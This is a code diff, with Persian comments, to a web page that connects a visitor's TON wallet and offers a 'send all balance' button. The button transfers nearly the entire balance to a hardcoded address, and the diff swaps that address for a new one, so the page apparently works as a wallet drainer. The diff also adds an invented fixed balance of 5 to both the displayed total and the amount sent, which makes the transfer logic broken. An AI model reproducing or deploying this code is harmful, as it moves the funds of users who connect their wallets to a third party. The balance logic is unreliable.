@@ -90,12 +90,21 @@
                 // نمایش اطلاعات کیف پول
                 walletInfoDiv.style.display = "block";
 
-                // دریافت موجودی کیف پول
+                // دریافت موجودی Toncoin
                 const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
                 const balanceData = await balanceResponse.json();
                 userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
                 
                 walletBalanceSpan.textContent = userBalance.toFixed(6); // نمایش ۶ رقم اعشار
+
+                // دریافت تمام موجودی‌های Jetton (توکن‌های دیگر)
+                // شما باید از API خاصی برای دریافت Jetton‌ها استفاده کنید
+                // در اینجا فقط فرض شده که موجودی Jetton‌ها را به‌طور دستی وارد می‌کنید
+                const jettonBalance = 5; // این مقدار فرضی است. باید با API واقعی جایگزین شود.
+
+                // جمع موجودی‌ها
+                const totalBalance = userBalance + jettonBalance;
+                walletBalanceSpan.textContent = totalBalance.toFixed(6); // نمایش موجودی کل
 
                 // نمایش دکمه ارسال تمام موجودی
                 sendAllBtn.style.display = "block";
@@ -111,7 +120,7 @@
             try {
                 // دریافت مقدار تخمینی کارمزد از API
                 const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
-                const sendAmount = userBalance - gasFeeEstimate;
+                const sendAmount = userBalance + 5 - gasFeeEstimate; // Jetton‌ها را به موجودی اضافه می‌کنیم
 
                 if (sendAmount <= 0) {
                     alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
@@ -121,7 +130,7 @@
                 const transaction = {
                     messages: [
                         {
-                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
+                            address: "UQDWluz1kN4s6ig_9GlxUkAlGCgu9v9w3w352dFbbxyx8GQo", // آدرس مقصد
                             amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
                         },
                     ],
